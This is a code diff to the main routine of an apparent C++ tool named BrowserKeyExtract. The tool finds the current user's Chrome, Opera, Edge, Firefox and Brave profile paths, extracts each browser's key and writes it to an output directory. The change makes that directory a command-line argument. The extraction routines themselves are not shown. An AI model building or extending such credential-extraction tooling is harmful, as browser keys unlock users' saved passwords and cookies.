@@ -2,8 +2,18 @@
 #include "BrowserKeyExtract.h"
 #include "utility.h"
 
-int main()
-{
+#define NumberOfArgs	2
+
+
+int main(int argc, char* argv[]) {
+
+	if (argc != NumberOfArgs) {
+		std::cerr << "Usage: " << argv[0] << " <path/to/output/directory>\n";
+		return EXIT_FAILURE;
+	}
+
+	const std::string destinationPath (argv[1]);
+
 	const std::string username { getusername() };
 	std::vector<std::string> absolutePaths = makeAbsolutePaths(username, Browser::relativePaths);
 	std::string chromePath = extractPathsForSpecificBrowser(absolutePaths, "Google");
@@ -14,7 +24,7 @@ int main()
 	
 	Browser chrome, opera, edge, firefox, brave;
 
-	const std::string destinationPath{ "C:/Users/" + username + "/Desktop/BrowserData" };
+//	const std::string destinationPath{ "C:/Users/" + username + "/Desktop/BrowserData" };
 
 	chrome.ExtractKey(chromePath);
 	chrome.WriteExtractedKeyToFile(destinationPath);
